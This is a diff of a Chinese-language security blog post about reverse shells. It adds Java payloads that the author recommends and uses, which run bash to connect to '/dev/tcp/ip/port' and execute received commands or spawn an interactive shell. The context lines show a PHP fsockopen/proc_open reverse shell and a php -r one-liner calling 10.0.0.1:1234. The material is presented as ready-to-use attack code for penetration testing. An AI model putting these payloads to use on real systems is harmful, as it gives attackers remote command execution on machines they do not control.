@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="geez博客">
 <meta property="og:description" content="反弹shell">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-08-29T15:41:36.032Z">
+<meta property="og:updated_time" content="2019-09-26T01:58:46.515Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="关于反弹shell的那些事">
 <meta name="twitter:description" content="反弹shell">
@@ -203,6 +203,12 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$sock = fsockopen($ip, $port);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; $sock,</span><br><span class="line">        <span class="number">1</span> =&gt; $sock,</span><br><span class="line">        <span class="number">2</span> =&gt; $sock</span><br><span class="line">);</span><br><span class="line">$process = proc_open(<span class="string">'/bin/sh'</span>, $descriptorspec, $pipes);</span><br><span class="line">proc_close($process);</span><br></pre></td></tr></table></figure>
 
 <p>真的是比网上的那些php反弹shell（比如：php -r ‘$sock=fsockopen(“10.0.0.1”,1234);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’）成功率高很多。当然此方法也有限制，限制就是系统没有禁用 proc_popen(默认不禁用)。</p>
+<p>还有网上广泛的java反弹shell，但是在我测试的时候经常是失败的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
+
+<p>上面这种我测试经常是失败的，可能是版本不支持或者写法有问题吧，具体不太清楚。<br>也给大家推荐我常用的java的反弹shell:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// payload1</span></span><br><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;);</span><br><span class="line">p.waitFor();</span><br><span class="line"></span><br><span class="line"><span class="comment">//payload2</span></span><br><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span>&#125;);</span><br><span class="line">p.waitFor();</span><br></pre></td></tr></table></figure>
+
 <h4 id="加密的反弹shell"><a href="#加密的反弹shell" class="headerlink" title="加密的反弹shell"></a>加密的反弹shell</h4><p>这个是源于看freebuf的一篇文章，后来才知道原来ssl也可以进行反弹shell的加密。这样我们执行的命令流量就不能被分析出来了（在实战中可能有更大的用处，毕竟留痕更少）。</p>
 <ul>
 <li><p>1 首先，vps上生成SSL证书的公私钥对</p>
@@ -398,6 +404,19 @@
         </div>
         
         
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#众所周知的反弹shell"><span class="toc-number">1.</span> <span class="toc-text">众所周知的反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#加密的反弹shell"><span class="toc-number">2.</span> <span class="toc-text">加密的反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用cron的反弹shell"><span class="toc-number">3.</span> <span class="toc-text">利用cron的反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#交互式shell"><span class="toc-number">4.</span> <span class="toc-text">交互式shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#补充下windows-反弹shell"><span class="toc-number">5.</span> <span class="toc-text">补充下windows 反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#总结"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
+        
     </div>
 </aside>
 
@@ -466,7 +485,7 @@
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
-		toc_hide_index: true,
+		toc_hide_index: false,
 		root: "/",
 		innerArchive: true,
 		showTags: false
